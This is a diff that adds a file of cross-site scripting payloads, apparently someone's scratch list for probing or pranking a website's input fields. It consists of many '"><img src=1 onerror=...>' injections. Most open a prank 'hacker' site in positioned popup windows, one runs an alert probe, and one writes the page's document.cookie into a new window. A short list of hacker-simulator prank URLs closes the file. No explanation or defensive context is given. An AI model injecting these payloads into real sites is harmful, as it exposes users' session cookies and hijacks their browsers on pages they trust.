@@ -1,0 +1,58 @@
+
+
+"><img src=1 onerror=alert('vulnerable')>
+
+
+
+"><img src=1 onerror=document.body.style.color = color;>
+
+"><img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');" 
+
+"><img src="1" onerror="let newWindow = window.open('', '_blank', 'width=800,height=600');newWindow.document.write(document.cookie);">
+
+
+
+"><img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank');">
+
+
+"><img src="/ai_img.png">
+<img src="/ai_img.png">
+<img src="/ai_img.png">
+<img src="/ai_img.png">
+<img src="/ai_img.png">
+<img src="/ai_img.png">
+<img src="/ai_img.png">
+<img src="/ai_img.png">
+
+
+
+
+
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600');">
+
+
+"><img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,top=200,left=10');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,top=200,right=window.innerWidth-810');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,bottom=200,left=200');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,bottom=800,left=200');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,bottom=400,left=200');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,bottom=400,right=200');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,bottom=400,right=200');">
+<img src="1" onerror="window.open('https://pranx.com/hacker/', '_blank', 'width=800,height=600,bottom=window.innerHeight-610,right=window.innerHeight - 610');">
+
+
+https://geektyper.com/
+
+https://pranx.com/hacker/
+
+https://cyber-simulator.com
+
